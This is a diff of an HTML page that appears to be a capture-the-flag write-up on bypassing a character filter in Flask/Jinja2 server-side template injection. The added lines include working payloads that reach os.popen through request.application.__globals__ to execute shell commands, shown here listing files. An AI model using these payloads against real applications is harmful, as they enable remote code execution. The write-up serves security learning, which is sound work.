@@ -124,7 +124,26 @@
                                             to deploy our own instance I also retrieved data about the directory
                                             structure of the web app which notably remained consistent in both
                                             challenges, so I will not be reposting the following within this page.
+
                                             <br>
+                                            <pre
+                                                class="align-items-center"><code class="language-python">Directory Structure of Web Application
+
+│   entrypoint.sh
+│   flag.txt
+│
+└───app
+        app.py
+        requirements.txt</code></pre>
+                                            <br>
+
+                                            IT IS ALSO REVEALED IN THE CHALLENGE DESCRIPTION THAT THE FLAG LIES WITHIN THE ROOT DIRECTORY.
+
+
+                                            <br>
+
+                                            <h2>Challenge 1: Medium Difficulty</h2>
+                                            SRC:
                                             <pre class="align-items-center"><code class="language-python">from flask import Flask, request, render_template_string, abort
 app = Flask(__name__)
 # Don&#39;t let them cat my flag!
@@ -323,7 +342,7 @@ def hello_world():
                                                 data-src="images/temp-mit-3.png" data-sizes="auto">
                                             <br>
 
-                                            Wait.. what the hell is MRO? Don't ask me that's far above my paygrade..
+                                            Wait.. what the hell is MRO? Don't ask me that's far above my paygrade..<br><br>
 
                                             Nah, just kidding! Here is a <a
                                                 href="https://pencilprogrammer.com/python-mro/">website</a> if you're
@@ -578,7 +597,7 @@ def hello_world():
                                             I returned to the Flask/Jinja2 documentation and decided to research if
                                             there was any other way to begin a template without the use of double curly
                                             brackets as that is also a huge factor in achieving my goal.
-                                            <br>
+                                            <br><br>
 
                                             <img loading="lazy" class="aligncenter vp-lazyload"
                                                 data-src="images/temp-mit-9.png" data-sizes="auto">
@@ -590,7 +609,7 @@ def hello_world():
                                             (Remote Code Execution) without use of double curly brackets.<br><br>
 
                                             Click <a href="https://hackmd.io/@Chivato/HyWsJ31dI">here</a> for a link to
-                                            the writeup if you are interested for your own reading.
+                                            the writeup if you are interested for your own reading.<br><br>
 
                                             Here are some key snippets from that writeup that I looked into:<br>
                                             <img loading="lazy" class="aligncenter vp-lazyload"
@@ -673,8 +692,21 @@ def hello_world():
                                             this, so this was not too complicated of a task.
                                             <br><br>
                                             New Payload:
+
                                             <pre
-                                                class="align-items-center"><code class="language-python">?p={{request.application.__globals__.__builtins__.__import__(request.args.l).popen(request.args.d).read()}}&l=os&d=ls</code></pre>
+                                            class="align-items-center"><code class="language-python">?p={{request.application.__globals__.__builtins__.__import__(request.args.l).popen(request.args.d).read()}}&l=os&d=ls</code></pre>
+                                        <br>
+
+                                        <img loading="lazy" class="aligncenter vp-lazyload"
+                                        data-src="images/temp-mit-20.png" data-sizes="auto">
+                                        <br>
+
+                                        Bingo! We have our payload with no usage of strings and therefore we have bypassed all the characters on the filter list if we put all the knowledge I found together.
+                                        <br><br>
+                                        I formed this payload for the second challenge:
+                                        <br>
+                                            <pre
+                                                class="align-items-center"><code class="language-python">?p={%print(request.application.__globals__.__builtins__.__import__(request.args.d).popen(request.args.l).read())%}&d=os&l=ls</code></pre>
                                             <br>
 
                                             <img loading="lazy" class="aligncenter vp-lazyload"
